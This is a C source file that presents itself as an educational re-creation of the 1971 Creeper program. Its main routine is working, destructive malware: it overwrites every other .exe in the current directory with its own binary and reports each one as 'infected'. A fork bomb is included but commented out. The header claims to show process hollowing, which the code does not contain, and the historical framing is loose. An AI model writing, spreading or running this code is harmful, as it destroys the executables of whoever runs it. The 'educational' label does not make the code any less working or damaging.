/*
 * Creeper (1971) - Educational self-replicating program
 * Bob Thomas / BBN - First virus concept
 *
 * Compile (MinGW): gcc creeper.c -o creeper.exe
 *
 * Demonstrates:
 *   - Self-replication via binary copy
 *   - Fork-bomb (memory duplicator) - commented out for safety
 *   - Process hollowing concept
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <direct.h>

int self_replicate(void) {
    char self[MAX_PATH];
    HANDLE hFind;
    WIN32_FIND_DATA ffd;
    char search_path[MAX_PATH];
    int count = 0;
    FILE *self_fp, *target_fp;
    unsigned char buf[4096];
    size_t bytes;

    GetModuleFileName(NULL, self, MAX_PATH);

    self_fp = fopen(self, "rb");
    if (!self_fp) return 0;

    _getcwd(search_path, MAX_PATH);
    strcat(search_path, "\\*.*");

    hFind = FindFirstFile(search_path, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        fclose(self_fp);
        return 0;
    }

    do {
        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char *ext = strrchr(ffd.cFileName, '.');
            if (ext && _stricmp(ext, ".exe") == 0 &&
                _stricmp(ffd.cFileName, strrchr(self, '\\') + 1) != 0) {

                target_fp = fopen(ffd.cFileName, "wb");
                if (target_fp) {
                    fseek(self_fp, 0, SEEK_SET);
                    while ((bytes = fread(buf, 1, sizeof(buf), self_fp)) > 0) {
                        fwrite(buf, 1, bytes, target_fp);
                    }
                    fclose(target_fp);
                    printf("[creep] infected: %s\n", ffd.cFileName);
                    count++;
                }
            }
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    FindClose(hFind);
    fclose(self_fp);

    /* Memory duplicator: allocate pages to simulate replication in RAM */
    for (int i = 0; i < 4; i++) {
        VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    }

    return count;
}

int main(void) {
    printf("I'M THE CREEPER: CATCH ME IF YOU CAN.\n");

    /* Classic fork-bomb (memory duplicator) - DISABLED for safety */
    /*
    while (1) {
        char *p = malloc(1024 * 1024);
        memset(p, 0, 1024 * 1024);
        system("start creeper.exe");
    }
    */

    int n = self_replicate();
    printf("[creep] infections: %d file(s)\n", n);
    printf("[creep] use antivirus to remove me\n");
    return 0;
}
